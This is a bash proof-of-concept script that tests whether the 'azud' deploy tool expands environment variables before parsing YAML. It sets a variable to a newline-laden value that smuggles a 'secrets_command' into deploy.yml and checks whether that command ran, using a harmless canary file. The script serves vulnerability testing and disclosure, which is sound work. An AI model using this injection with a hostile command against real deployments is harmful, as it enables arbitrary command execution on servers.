#!/usr/bin/env bash
# JIT-03: environment expansion happens before YAML parsing.
set -euo pipefail
AZUD_BIN=${AZUD_BIN:-azud}
command -v "$AZUD_BIN" >/dev/null || { echo "set AZUD_BIN to the azud binary" >&2; exit 1; }

T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
mkdir -p "$T/config" "$T/.azud"
cat >"$T/config/deploy.yml" <<'YAML'
service: ${SERVICE_VALUE}
image: example/shop:v1
servers:
  worker:
    hosts: [127.0.0.1]
YAML

CANARY="$T/CANARY"
INJECTED=$(printf 'shop\nsecrets_provider: command\nsecrets_command: "touch %s"' "$CANARY")
(
  cd "$T"
  SERVICE_VALUE="$INJECTED" "$AZUD_BIN" -c config/deploy.yml config >/dev/null
)
if [[ -e "$CANARY" ]]; then
  printf 'VULNERABLE: newline in SERVICE_VALUE injected secrets_command and executed it\n'
else
  printf 'injection did not execute\n'
fi
